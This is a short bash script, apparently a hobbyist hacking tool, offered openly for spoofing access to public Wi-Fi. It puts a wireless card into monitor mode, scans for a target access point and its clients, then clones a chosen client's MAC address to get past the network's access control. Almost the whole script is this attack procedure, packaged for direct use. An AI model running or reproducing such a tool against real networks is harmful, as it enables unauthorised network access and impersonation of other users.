#!/usr/bin/bash

printf "                 [Created By] Eng InfoSec-HA [Twitter] InfoSec-HA \n\n"
echo  "    _       _                 _______          _________   _        "
echo  "   | |     | |           (0) |  _____| (0)    / ________  | |       "
echo  "   | |     | |            _  | |_____  _     / /________  | |       "
echo  "   | |-----| |  ______   | | |  _____|| |   /_______   /  | |_____  "
echo  "   | |-----| | (  ___ )  | | | |      | |          /  /   |  ____ | "
echo  "   | |     | | ( |___|)_ | | | |      | |   ______/  /    | |   | | " 
echo  "   |_|     |_| (______)_|| | | |      | |  |________/     |_|   |_| "                       
echo  "                                                                    "
printf "                               ...Press Enter to Continue...                    \n"

read 

while [ true ]
do
echo "  ------------------------ " 
printf "[*] Available Options : |   \n"
echo "  --------------------------------------"
printf "1) Spoof Enternet fom Puplicie Wifi !  \n"
echo   "--------------------------------------  "

printf "[*] Enter the Number of your Choies : "
read input
case $input in
        1) airmon-ng start wlan0
          sleep 2
         airodump-ng wlan0mon 
         printf "[+] Enter the Target BSSID : "
         read bssid 
         printf "[+] Enter the Target Chanl : "
         read chanl
         airodump-ng --bssid $bssid -c $chanl wlan0mon
         airmon-ng stop wlan0mon
          sleep 4
         ifconfig wlan0 down
          sleep 2
         printf "[+] Enter the Target Mac Address : "
         read mact
         macchanger --mac $mact wlan0
          sleep 4
         ifconfig wlan0 up
          sleep 3
         printf "The Process Completed Successfily, Go to Admin Website.../n";;
esac
done
